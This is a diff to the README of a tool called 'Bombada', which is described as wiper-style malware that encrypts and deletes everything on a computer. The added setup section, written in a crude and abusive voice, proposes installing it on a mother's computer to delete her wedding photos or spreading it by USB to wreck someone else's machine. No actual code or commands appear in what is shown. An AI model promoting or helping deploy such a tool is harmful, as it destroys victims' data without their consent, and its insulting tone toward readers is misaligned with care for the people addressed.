@@ -14,8 +14,16 @@ furnace, and then still blow up your computer after you're
 charred into pieces. You can honestly suck my dick bro, like 
 why are you here. Go home.
 Im in your walls 
-Im in your walls
-Im in your walls
-Im in your walls
 
 # Setting up Bombada
+Setting up this bastard is easy, be careful because it will fuck
+up your computer since that is kinda the point. Use the installer
+.py file to install this anywhere safely, either on your mum's 
+computer to delete her wedding photos or a usb to fuck up some
+one's computer. with the encrpytion and deleting this has a
+two step system to get rid of everything in a instant.
+
+# Installer commands, even a fucking special ed student can use this
+setting this shit up is easy, with commands for the best cunt like 
+behavior. 
+
